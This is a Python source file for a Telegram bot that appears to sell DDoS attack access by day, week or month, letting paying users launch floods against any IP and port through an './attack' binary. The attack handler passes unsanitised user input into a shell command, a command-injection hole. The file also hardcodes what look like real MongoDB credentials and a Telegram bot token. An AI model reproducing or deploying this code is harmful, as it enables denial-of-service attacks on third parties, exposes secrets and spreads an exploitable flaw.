# -*- coding: utf-8 -*-
import telebot
import subprocess
import pymongo
import certifi
import datetime
import time
import logging
import random
import string
from pymongo import MongoClient

# ---------------- MongoDB Configuration ----------------
MONGO_URI = 'mongodb+srv://Ageon:vQXSBs8M73gWVYzt@cluster0.ltsfi.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0'
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['AGEON']
users_collection = db.users              # Allowed users
free_users_collection = db.free_users    # Free user credits
command_logs_collection = db.command_logs  # Command logs
attack_logs_collection = db.attack_logs    # Attack logs

# ---------------- Telegram Bot Configuration ----------------
BOT_TOKEN = '8177353488:AAGyOoxcKU7SZWUFH0UKeeMHyisr1YwJQ7w'
bot = telebot.TeleBot(BOT_TOKEN)

# Owner and admin user IDs (strings)
owner_id = "6552242136"
admin_ids = ["6552242136"]

# In-memory dictionaries for cooldowns and gift codes
attack_cooldown = {}
gift_codes = {}

# Key prices for different durations
key_prices = {
    "day": 200,
    "week": 900,
    "month": 1800
}

# ---------------- Utility Functions ----------------

def get_current_time():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def log_command_db(user_id, target, port, duration):
    """Insert command log into MongoDB."""
    try:
        chat = bot.get_chat(user_id)
        username = "@" + chat.username if chat.username else f"UserID: {user_id}"
    except Exception:
        username = f"UserID: {user_id}"
    log_entry = {
        "user_id": user_id,
        "username": username,
        "target": target,
        "port": port,
        "duration": duration,
        "timestamp": datetime.datetime.now()
    }
    command_logs_collection.insert_one(log_entry)

def is_allowed_user(user_id):
    """Check if user is allowed by querying the 'users' collection and expiration date."""
    doc = users_collection.find_one({"user_id": user_id})
    if doc:
        expiration = datetime.datetime.strptime(doc["expiration"], "%Y-%m-%d %H:%M:%S")
        if datetime.datetime.now() <= expiration:
            return True
    return False

def approve_user_db(user_id, duration):
    """Approve user by inserting/updating a document in 'users' collection."""
    days = 1 if duration == "day" else 7 if duration == "week" else 30
    expiration_date = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"expiration": expiration_date}},
        upsert=True
    )

def remove_user_db(user_id):
    """Remove user from 'users' collection."""
    users_collection.delete_one({"user_id": user_id})

def get_free_balance(user_id):
    """Get free user balance from 'free_users' collection."""
    doc = free_users_collection.find_one({"user_id": user_id})
    if doc:
        return doc.get("credits", 0)
    return 0

def update_free_balance(user_id, credits):
    """Update free user balance in the DB."""
    free_users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"credits": credits}},
        upsert=True
    )

# ---------------- Command Handlers ----------------

@bot.message_handler(commands=['start'])
def send_welcome(message):
    response = (
        f"\U0001F31F Welcome to the Network Stress Testing Bot! \U0001F31F\n\n"
        f"Current Time: {get_current_time()}\n\n"
        "Available Commands:\n"
        "\U0001F464 /approveuser <id> <duration> - Approve a user (day, week, month) [Admin/Owner]\n"
        "\U0000274C /removeuser <id> - Remove a user [Admin/Owner]\n"
        "\U0001F511 /addadmin <id> <balance> - Add an admin with starting balance [Owner only]\n"
        "\U0001F6AB /removeadmin <id> - Remove an admin [Owner only]\n"
        "\U0001F4B0 /checkbalance - Check your balance\n"
        "\U0001F4A5 /attack <ip> <port> <time> - Launch an attack using shell subprocess\n"
        "\U0001F4B8 /setkeyprice <day/week/month> <price> - Set key price [Owner only]\n"
        "\U0001F381 /creategift <duration> - Create a gift code [Admin only]\n"
        "\U0001F381 /redeem <code> - Redeem a gift code\n\n"
        "Please use these commands responsibly. \U0001F60A"
    )
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['approveuser'])
def approve_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            target_user = command[1]
            duration = command[2].lower()
            if duration not in key_prices:
                bot.send_message(message.chat.id, "Invalid duration. Use 'day', 'week', or 'month'.")
                return
            approve_user_db(target_user, duration)
            bot.send_message(message.chat.id, f"\U00002705 User {target_user} approved for {duration}.")
        else:
            bot.send_message(message.chat.id, "Usage: /approveuser <id> <duration>")
    else:
        bot.send_message(message.chat.id, "\U0001F6AB Only Admin or Owner can run this command.")

@bot.message_handler(commands=['removeuser'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            target_user = command[1]
            remove_user_db(target_user)
            bot.send_message(message.chat.id, f"\U00002705 User {target_user} removed successfully.")
        else:
            bot.send_message(message.chat.id, "Usage: /removeuser <id>")
    else:
        bot.send_message(message.chat.id, "\U0001F6AB Only Admin or Owner can run this command.")

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            admin_to_add = command[1]
            try:
                balance = int(command[2])
            except ValueError:
                bot.send_message(message.chat.id, "\U000026A0 Balance must be a number.")
                return
            if admin_to_add not in admin_ids:
                admin_ids.append(admin_to_add)
                update_free_balance(admin_to_add, balance)
                bot.send_message(message.chat.id, f"\U00002705 Admin {admin_to_add} added with balance {balance}.")
            else:
                bot.send_message(message.chat.id, "\U000026A0 Admin already exists.")
        else:
            bot.send_message(message.chat.id, "Usage: /addadmin <id> <balance>")
    else:
        bot.send_message(message.chat.id, "\U0001F6AB Only the Owner can run this command.")

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            admin_to_remove = command[1]
            if admin_to_remove in admin_ids:
                admin_ids.remove(admin_to_remove)
                bot.send_message(message.chat.id, f"\U00002705 Admin {admin_to_remove} removed successfully.")
            else:
                bot.send_message(message.chat.id, f"\U000026A0 Admin {admin_to_remove} not found.")
        else:
            bot.send_message(message.chat.id, "Usage: /removeadmin <id>")
    else:
        bot.send_message(message.chat.id, "\U0001F6AB Only the Owner can run this command.")

@bot.message_handler(commands=['checkbalance'])
def check_balance(message):
    user_id = str(message.chat.id)
    balance = get_free_balance(user_id)
    bot.send_message(message.chat.id, f"\U0001F4B0 Your current balance is {balance} credits.")

@bot.message_handler(commands=['setkeyprice'])
def set_key_price(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            duration = command[1].lower()
            try:
                price = int(command[2])
            except ValueError:
                bot.send_message(message.chat.id, "\U000026A0 Price must be a number.")
                return
            if duration in key_prices:
                key_prices[duration] = price
                bot.send_message(message.chat.id, f"\U00002705 Key price for {duration} set to {price} credits.")
            else:
                bot.send_message(message.chat.id, "Invalid duration. Use 'day', 'week', or 'month'.")
        else:
            bot.send_message(message.chat.id, "Usage: /setkeyprice <day/week/month> <price>")
    else:
        bot.send_message(message.chat.id, "\U0001F6AB Only the Owner can run this command.")

@bot.message_handler(commands=['creategift'])
def create_gift(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        command = message.text.split()
        if len(command) == 2:
            duration = command[1].lower()
            if duration in key_prices:
                amount = key_prices[duration]
                balance = get_free_balance(user_id)
                if balance >= amount:
                    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
                    gift_codes[code] = duration
                    update_free_balance(user_id, balance - amount)
                    bot.send_message(message.chat.id, f"\U0001F381 Gift code created: {code} for {duration}.")
                else:
                    bot.send_message(message.chat.id, "\U000026A0 You do not have enough credits to create a gift code.")
            else:
                bot.send_message(message.chat.id, "Invalid duration. Use 'day', 'week', or 'month'.")
        else:
            bot.send_message(message.chat.id, "Usage: /creategift <duration>")
    else:
        bot.send_message(message.chat.id, "\U0001F6AB Only Admins can run this command.")

@bot.message_handler(commands=['redeem'])
def redeem_gift(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) == 2:
        code = command[1]
        if code in gift_codes:
            duration = gift_codes.pop(code)
            approve_user_db(user_id, duration)
            bot.send_message(message.chat.id, f"\U00002705 Gift code redeemed: You have been granted access for {duration}.")
        else:
            bot.send_message(message.chat.id, "\U000026A0 Invalid or expired gift code.")
    else:
        bot.send_message(message.chat.id, "Usage: /redeem <code>")

@bot.message_handler(commands=['attack'])
def attack(message):
    user_id = str(message.chat.id)
    if not is_allowed_user(user_id):
        bot.send_message(message.chat.id, "\U0001F6AB You are not authorized to use this bot. Contact admin for access.")
        return

    if user_id in attack_cooldown and time.time() - attack_cooldown[user_id] < 60:
        wait_time = 60 - (time.time() - attack_cooldown[user_id])
        bot.send_message(message.chat.id, f"\U000023F3 Please wait {wait_time:.1f} seconds before using /attack again.")
        return

    command_args = message.text.split()
    if len(command_args) < 4:
        bot.send_message(message.chat.id, "Usage: /attack <ip> <port> <time>")
        return

    target = command_args[1]
    port = command_args[2]
    try:
        duration = int(command_args[3])
    except ValueError:
        bot.send_message(message.chat.id, "\U000026A0 Time must be a numerical value.")
        return

    # Construct command: ./attack <ip> <port> <time> 90
    attack_command = f"./attack {target} {port} {duration} 90"
    bot.send_message(
        message.chat.id,
        f"\U0001F525 Attack Initiated! \U0001F525\n\n"
        f"\U0001F3AF Target: {target}\n"
        f"\U0001F529 Port: {port}\n"
        f"\U000023F1 Duration: {duration} sec\n"
        "Please wait..."
    )
    try:
        process = subprocess.Popen(attack_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        stdout, stderr = process.communicate(timeout=duration + 10)
        success = process.returncode == 0

        log_command_db(user_id, target, port, duration)

        # Insert attack log into MongoDB
        attack_log = {
            "user_id": user_id,
            "target": target,
            "port": port,
            "duration": duration,
            "timestamp": datetime.datetime.now(),
            "stdout": stdout.decode("utf-8"),
            "stderr": stderr.decode("utf-8"),
            "success": success
        }
        attack_logs_collection.insert_one(attack_log)

        if success:
            attack_cooldown[user_id] = time.time()
            bot.send_message(message.chat.id, f"\U00002705 Attack Finished Successfully on {target}:{port}!")
        else:
            bot.send_message(message.chat.id, "\U0000274C Attack process failed. Please try again later.")
    except subprocess.TimeoutExpired:
        process.kill()
        bot.send_message(message.chat.id, "\U0000231A Attack process timed out.")
    except Exception as e:
        bot.send_message(message.chat.id, f"\U000026A0 An error occurred: {e}")

@bot.message_handler(func=lambda message: True)
def handle_unknown_command(message):
    response = (
        f"\U0001F31F Welcome to the AGEON THE CONQUEROR Bot! \U0001F31F\n\n"
        f"Current Time: {get_current_time()}\n\n"
        "Available Commands:\n"
        "\U0001F464 /approveuser <id> <duration>\n"
        "\U0000274C /removeuser <id>\n"
        "\U0001F511 /addadmin <id> <balance>\n"
        "\U0001F6AB /removeadmin <id>\n"
        "\U0001F4B0 /checkbalance\n"
        "\U0001F4A5 /attack <ip> <port> <time>\n"
        "\U0001F4B8 /setkeyprice <day/week/month> <price>\n"
        "\U0001F381 /creategift <duration>\n"
        "\U0001F381 /redeem <code>\n\n"
        "Please use these commands responsibly. \U0001F60A"
    )
    bot.send_message(message.chat.id, response)

# ---------------- Main Polling Loop ----------------
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"Bot polling error: {e}")
        time.sleep(5)
